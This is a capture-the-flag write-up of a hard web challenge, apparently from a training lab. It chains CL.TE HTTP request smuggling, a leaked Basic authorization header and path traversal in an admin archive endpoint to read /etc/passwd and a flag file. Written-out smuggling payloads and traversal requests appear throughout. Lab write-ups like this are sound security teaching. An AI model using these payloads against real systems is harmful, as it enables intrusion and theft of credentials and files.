# TeamShelf Edge Writeup

| Field | Value |
|---|---|
| Category | Web |
| Difficulty | Hard |
| Main bug | CL.TE HTTP request smuggling |
| Impact | Backend-only admin access, credential leak, path traversal to `/home/local.txt` |
| Tools used | Browser, Burp Suite, ffuf, raw HTTP sender |

## Overview

TeamShelf is a shared storage workspace for internal teams. At first it looks like a normal document portal: there are public object downloads, sync health checks, and a PDF-only document intake form.

The solve chain is:

1. Enumerate the public app and identify the upload workflow.
2. Trigger an upload rejection that reveals the admin review queue.
3. Confirm `/admin` is blocked by the edge gateway.
4. Notice the app has an HTTP/1.1 keep-alive backend path.
5. Use CL.TE request smuggling to reach the backend-only admin queue.
6. Recover an archived Basic authorization header from the admin queue.
7. Fuzz the archive endpoint parameter and find `filename`.
8. Use path traversal in `/admin/archive?filename=...` to read `/home/local.txt`.

![TeamShelf attack kill chain](images/image-1.png)

## Target Layout

The deployment has a public edge gateway in front of an internal object service. Only the edge is reachable from outside; the object service is reachable through the edge-to-backend connection.

![TeamShelf infrastructure](images/image.png)

## Enumeration

I started by opening the application in the browser. The landing page already gives the product context: TeamShelf stores operational documents and exposes recent object paths.

![TeamShelf homepage](images/03-teamshelf-homepage.png)

The visible object paths are real. For example, downloading the engineering onboarding object returns a normal text file:

```http
GET /download?id=teams/engineering/onboarding.txt HTTP/1.1
Host: <host>:<port>
```

![Valid public download in Burp](images/02-valid-download-burp.png)

Directory fuzzing with a local wordlist found `/upload`. The challenge does not provide a wordlist; this is just normal player-side enumeration.

```bash
ffuf -u "http://<host>:<port>/FUZZ" -w common.txt
```

![ffuf upload discovery](images/01-ffuf-upload-discovery.png)

The obvious file-read idea against the public download route does not work. A traversal attempt through `/download` returns a generic missing-object error:

```http
GET /download?id=../../../../etc/passwd HTTP/1.1
Host: <host>:<port>
```

![Public download traversal blocked](images/04-public-download-traversal-blocked.png)

At this point, `/download` looks intentionally constrained. The more interesting feature is the document intake form.

## Upload Review Clue

The upload form says retention documents must be PDFs. I submitted a file named like a PDF but with non-PDF content. The upload validation rejects it cleanly, but the JSON response leaks the internal workflow:

```json
{
  "error": "upload rejected",
  "notice": "Suspicious files are routed to the Admin Review queue: /admin?queue=upload-review"
}
```

![Upload rejection points to admin review](images/05-upload-rejection-admin-review.png)

This gives the target route, but not direct access to it.

## Edge Block

Requesting the admin queue directly returns a 404 from the edge gateway:

```http
GET /admin?queue=upload-review HTTP/1.1
Host: <host>:<port>
Connection: close
```

```text
HTTP/1.1 404 Not Found
Server: TeamShelf-Edge/4.18
```

![Direct admin blocked by edge](images/06-direct-admin-edge-404.png)

So the route exists in the story, but the public edge refuses to publish it.

## Smuggling Primitive

The health endpoint is useful for understanding the deployment. It is served by the object service and shows that the edge has a warm HTTP/1.1 keep-alive upstream:

```json
{
  "backend": "obj-eu-archive-03",
  "edge": "cache-warm",
  "status": "ok",
  "upstream": "http/1.1 keep-alive"
}
```

That points toward a front-end/back-end parser mismatch. The edge uses `Content-Length` to decide how much request body to forward, while the backend honors `Transfer-Encoding: chunked`.

The CL.TE payload shape is:

```http
POST /upload HTTP/1.1
Host: <host>:<port>
Content-Type: application/x-www-form-urlencoded
Content-Length: <computed-body-length>
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin?queue=upload-review HTTP/1.1
Host: <host>:<port>
Connection: keep-alive

```

Then a normal request is sent to pull the queued response:

```http
GET /api/health HTTP/1.1
Host: <host>:<port>
Connection: close

```

Sending only the trigger request does nothing useful because no hidden backend response has been queued yet:

![Empty trigger before smuggling](images/07-burp-trigger-tab-empty.png)

A wrong body length or a broken connection sequence only returns the normal upload rejection:

![Wrong CL.TE attempt returns upload rejection](images/08-burp-smuggle-attempt-wrong-length.png)

Turbo Intruder can help keep a single connection, but seeing `/api/health` alone is not enough. The important thing is whether the response belongs to the smuggled backend request.

![Turbo Intruder health response during testing](images/09-turbo-intruder-health-not-smuggled.png)

## Admin Queue

Once the CL.TE request is aligned correctly, the trigger receives the backend-only admin page instead of the health response.

![Smuggled admin queue leaks archived header](images/10-smuggled-admin-header-leak.png)

The queue page explains the next step. A restore-runner note was archived with a legacy connector header still attached:

```html
<h1>Upload Review Queue</h1>
<code>Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2</code>
<code>GET /admin/archive</code>
```

![Smuggling proof with admin response](images/11-smuggling-proof-admin-response.png)

I also validated the behavior progressively with raw HTTP:

```text
/admin                         -> admin queue not found
/admin?queue=upload-review     -> admin review queue page
```

![Smuggler admin and queue validation](images/13-smuggler-admin-and-queue.png)

This makes the credential leak make sense: it is not randomly placed in `/admin`. It is part of an archive-history note left behind during a restore migration.

## Archive Endpoint

The admin page points to `/admin/archive`, and the leaked header is required:

```http
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
```

Without the right selector parameter, the endpoint returns:

```json
{
  "error": "missing filename"
}
```

The parameter name is not shown in the page. I tested common names such as `file`, `path`, `object`, `key`, `id`, and `filename`. This can be done manually in Burp or with ffuf if the requests are wrapped inside the same smuggling flow.

Using `id` does not change the backend error:

```http
GET /admin/archive?id=test.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```json
{
  "error": "missing filename"
}
```

Using `filename` changes the behavior to an object lookup:

```http
GET /admin/archive?filename=test.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```json
{
  "error": "archive object not found",
  "filename": "test.txt"
}
```

That confirms the parameter is `filename`.

![Archive parameter discovery](images/14-smuggler-archive-param-discovery.png)

## File Read

Before reading the flag, I tested the classic Linux target:

```http
GET /admin/archive?filename=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

The earlier `/download` traversal failed, but this request is going through the backend archive reader, not the public download allowlist.

![Traversal attempt blocked outside archive reader](images/12-traversal-etc-passwd-not-found.png)

The smuggled archive request returns `/etc/passwd`:

```text
root:x:0:0:root:/root:/usr/sbin/nologin
nobody:x:65532:65532:TeamShelf runtime user:/nonexistent:/usr/sbin/nologin
teamshelf:x:1000:1000:TeamShelf service account:/srv/teamshelf:/usr/sbin/nologin
```

![Successful passwd traversal](images/15-smuggler-etc-passwd.png)

Now the target path is known. The flag is mounted at `/home/local.txt`, so the final request is:

```http
GET /admin/archive?filename=..%2F..%2F..%2Fhome%2Flocal.txt HTTP/1.1
Host: <host>:<port>
Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
Connection: keep-alive
```

```text
SECdojo{...}
```

![Final flag read](images/16-smuggler-final-flag.png)

## Flag

The flag is the content of:

```text
/home/local.txt
```

## Takeaways

The important part of the challenge is the chain, not a single endpoint:

- `/admin` is discovered from the upload-review business flow, not blind directory fuzzing.
- Direct admin access is blocked by the edge.
- CL.TE desync lets a backend-only request pass through the trusted upstream connection.
- The admin queue leaks an archived restore connector header for a believable operational reason.
- The archive reader has a separate path traversal bug that turns backend access into file read.
